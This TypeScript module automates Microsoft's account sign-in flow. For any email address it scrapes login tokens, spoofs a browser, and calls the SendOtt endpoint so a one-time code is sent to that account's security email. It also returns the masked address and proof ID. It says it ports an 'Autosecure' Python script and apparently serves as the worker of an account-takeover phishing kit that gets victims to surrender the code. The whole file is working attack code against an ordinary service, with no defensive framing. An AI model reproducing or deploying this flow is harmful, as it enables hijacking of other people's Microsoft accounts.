import { spawn } from "node:child_process";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { CookieJar, fetchWithJar } from "./cookie-jar.js";

/**
 * Prefer exact Autosecure Python/httpx flow (scripts/send_ott.py).
 * Fall back to Node port if Python/httpx unavailable.
 */

const UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SCRIPT = path.resolve(__dirname, "../scripts/send_ott.py");

function runPythonSendOtt(email: string): Promise<{
  ok: boolean;
  securityEmail?: string;
  proofId?: string;
  error?: string;
} | null> {
  return new Promise((resolve) => {
    const candidates = process.platform === "win32" ? ["python", "py", "python3"] : ["python3", "python"];
    let tried = 0;

    const tryNext = () => {
      if (tried >= candidates.length) {
        resolve(null);
        return;
      }
      const bin = candidates[tried++];
      const child = spawn(bin, [SCRIPT, email], {
        windowsHide: true,
        env: process.env,
      });
      let stdout = "";
      let stderr = "";
      child.stdout.on("data", (d) => {
        stdout += String(d);
      });
      child.stderr.on("data", (d) => {
        stderr += String(d);
      });
      child.on("error", () => tryNext());
      child.on("close", (code) => {
        const line = stdout.trim().split(/\r?\n/).filter(Boolean).pop() || "";
        if (!line) {
          if (stderr.includes("not found") || code === 9009) {
            tryNext();
            return;
          }
          console.error("[otp-send] python empty output", { bin, code, stderr: stderr.slice(0, 300) });
          resolve(null);
          return;
        }
        try {
          const j = JSON.parse(line) as {
            ok?: boolean;
            securityEmail?: string;
            proofId?: string;
            error?: string;
          };
          if (j.error?.includes("httpx not installed")) {
            console.error("[otp-send] httpx missing — run: pip install httpx");
            resolve(null);
            return;
          }
          console.log("[otp-send] python result", { ok: j.ok, err: j.error?.slice(0, 120) });
          resolve({
            ok: !!j.ok,
            securityEmail: j.securityEmail,
            proofId: j.proofId,
            error: j.error,
          });
        } catch {
          console.error("[otp-send] python bad json", line.slice(0, 200), stderr.slice(0, 200));
          resolve(null);
        }
      });
    };
    tryNext();
  });
}

function decodeUnicode(s: string): string {
  return s
    .replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
    .replace(/\\(.)/g, (_, c) => {
      if (c === "n") return "\n";
      if (c === "r") return "\r";
      if (c === "t") return "\t";
      if (c === '"') return '"';
      if (c === "\\") return "\\";
      if (c === "/") return "/";
      return c;
    });
}

async function getLiveData(jar: CookieJar): Promise<{ urlPost: string; ppft: string }> {
  const res = await fetchWithJar(
    jar,
    "https://login.live.com",
    {
      method: "POST",
      headers: {
        "User-Agent": UA,
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
      },
    },
    { followRedirects: false, timeoutMs: 30_000 },
  );
  const text = await res.text();
  const urlPostMatch =
    text.match(
      /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0/,
    ) || text.match(/https:\/\/login\.live\.com\/ppsecure\/post\.srf\?[^"'\\\s]+/);
  if (!urlPostMatch) throw new Error("Failed to extract urlPost");
  const ppftMatch =
    text.match(/name="PPFT"[^>]*value="([^"]+)"/) || text.match(/value=\\?"([^"]+)"/);
  if (!ppftMatch) throw new Error("Failed to extract PPFT");
  return { urlPost: urlPostMatch[0], ppft: ppftMatch[1] };
}

async function nodeSendOtt(email: string): Promise<{
  ok: boolean;
  securityEmail?: string;
  proofId?: string;
  error?: string;
}> {
  const jar = new CookieJar();
  await getLiveData(jar);

  const authRes = await fetch("https://login.live.com/GetCredentialType.srf", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json; charset=utf-8",
      Referer: "https://login.live.com/",
      Cookie: jar.getHeader(),
      hpgact: "0",
      hpgid: "33",
      "User-Agent": UA,
    },
    body: JSON.stringify({
      checkPhones: true,
      country: "",
      federationFlags: 3,
      forceotclogin: true,
      isCookieBannerShown: true,
      isExternalFederationDisallowed: true,
      isFederationDisabled: true,
      isFidoSupported: true,
      isOtherIdpSupported: false,
      isRemoteConnectSupported: false,
      isRemoteNGCSupported: true,
      isSignup: false,
      otclogindisallowed: false,
      username: email,
    }),
    redirect: "manual",
  });
  const setCookies =
    typeof (authRes.headers as Headers & { getSetCookie?: () => string[] }).getSetCookie ===
    "function"
      ? (authRes.headers as Headers & { getSetCookie: () => string[] }).getSetCookie()
      : authRes.headers.get("set-cookie")
        ? [authRes.headers.get("set-cookie")!]
        : [];
  jar.setFromResponse("https://login.live.com", setCookies);

  const info = (await authRes.json()) as Record<string, unknown>;
  if (Object.keys(info).length === 1) {
    return { ok: false, error: "Email OTP cooldown — wait a few minutes and try again." };
  }
  const creds = (info.Credentials as Record<string, unknown>) || null;
  if (!creds) return { ok: false, error: "Email does not exist / no credentials" };
  if (creds.RemoteNgcParams) return { ok: false, error: "Authenticator-only account" };
  const proofs = (creds.OtcLoginEligibleProofs as Array<Record<string, string>>) || [];
  if (!proofs.length) return { ok: false, error: "No email OTP proofs" };

  const selected = proofs[0];
  const securityEmail = selected.display || "unknown";
  const proofId = selected.data || "";

  const data = await getLiveData(jar);
  const loginData = await fetchWithJar(
    jar,
    data.urlPost,
    {
      method: "POST",
      headers: {
        "User-Agent": UA,
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://login.live.com",
        Referer: "https://login.live.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
      },
      body: new URLSearchParams({
        ps: "2",
        PPFT: data.ppft,
        PPSX: "Pass",
        login: email,
        loginfmt: email,
        type: "11",
        passwd: "",
      }).toString(),
    },
    { followRedirects: false, timeoutMs: 30_000 },
  );
  let page = await loginData.text();
  if (loginData.status >= 301 && loginData.status <= 308) {
    const loc = loginData.headers.get("location");
    if (loc) {
      const next = await fetchWithJar(
        jar,
        new URL(loc, data.urlPost).toString(),
        { method: "GET", headers: { "User-Agent": UA } },
        { followRedirects: true, maxRedirects: 5, timeoutMs: 30_000 },
      );
      page = await next.text();
    }
  }

  const action = page.match(/action="([^"]+)"/)?.[1];
  const iptRaw = page.match(/name="ipt"[^>]+value="([^"]+)"/)?.[1];
  const pprid = page.match(/name="pprid"[^>]+value="([^"]+)"/)?.[1];
  if (!action || !iptRaw || !pprid) {
    return {
      ok: false,
      securityEmail,
      proofId,
      error: `missing ipt/pprid: ${page.replace(/\s+/g, " ").slice(0, 160)}`,
    };
  }

  const identityConfirm = await fetchWithJar(
    jar,
    action,
    {
      method: "POST",
      headers: {
        "User-Agent": UA,
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://login.live.com",
        Referer: "https://login.live.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
      },
      body: new URLSearchParams({ pprid, ipt: decodeURIComponent(iptRaw) }).toString(),
    },
    { followRedirects: false, timeoutMs: 30_000 },
  );
  let identityText = await identityConfirm.text();
  if (identityConfirm.status >= 301 && identityConfirm.status <= 308) {
    const loc = identityConfirm.headers.get("location");
    if (loc) {
      const next = await fetchWithJar(
        jar,
        new URL(loc, action).toString(),
        { method: "GET", headers: { "User-Agent": UA } },
        { followRedirects: true, maxRedirects: 5, timeoutMs: 30_000 },
      );
      identityText = await next.text();
    }
  }

  const rawStr = identityText.match(/"rawProofList"\s*:\s*"([^"]+)"/);
  if (!rawStr) {
    return {
      ok: false,
      securityEmail,
      proofId,
      error: `no rawProofList: ${identityText.replace(/\s+/g, " ").slice(0, 160)}`,
    };
  }
  const raw = JSON.parse(decodeUnicode(rawStr[1])) as Array<Record<string, string>>;
  const epid = raw.find((p) => p.type === "Email" && p.epid)?.epid ?? raw[0]?.epid;
  if (!epid) return { ok: false, error: "no epid", securityEmail, proofId };

  const apiCanary = decodeUnicode(identityText.match(/"apiCanary"\s*:\s*"([^"]+)"/)?.[1] || "");
  const eipt = decodeUnicode(identityText.match(/"eipt"\s*:\s*"([^"]+)"/)?.[1] || "");
  const uaid = identityText.match(/"uaid"\s*:\s*"([^"]+)"/)?.[1] || "";
  if (!apiCanary || !eipt || !uaid) {
    return { ok: false, error: "missing canary/eipt/uaid", securityEmail, proofId };
  }

  const resp = await fetchWithJar(
    jar,
    "https://account.live.com/api/Proofs/SendOtt",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        hpgid: "200368",
        scid: "100166",
        canary: apiCanary,
        eipt,
        uaid,
        uiflvr: "1001",
        hpgact: "0",
        "User-Agent": UA,
      },
      body: JSON.stringify({
        token: "",
        purpose: "UnfamiliarLocationHard",
        epid,
        autoVerification: false,
        autoVerificationFailed: false,
        confirmProof: securityEmail,
        uaid,
        uiflvr: 1001,
        scid: 100166,
        hpgid: 200368,
      }),
    },
    { followRedirects: false, timeoutMs: 30_000 },
  );
  const t = await resp.text().catch(() => "");
  console.log("[otp-send] node SendOtt", resp.status, t.slice(0, 200));
  if (resp.status === 200) return { ok: true, securityEmail, proofId };
  return {
    ok: false,
    securityEmail,
    proofId,
    error: `SendOtt ${resp.status}: ${t.slice(0, 150)}`,
  };
}

export async function sendOtpFromWorker(email: string): Promise<{
  ok: boolean;
  securityEmail?: string;
  proofId?: string;
  error?: string;
}> {
  try {
    const py = await runPythonSendOtt(email);
    if (py) return py;
    console.warn("[otp-send] python path unavailable — using node fallback");
    return await nodeSendOtt(email);
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    console.error("[otp-send] error:", msg);
    return { ok: false, error: msg };
  }
}
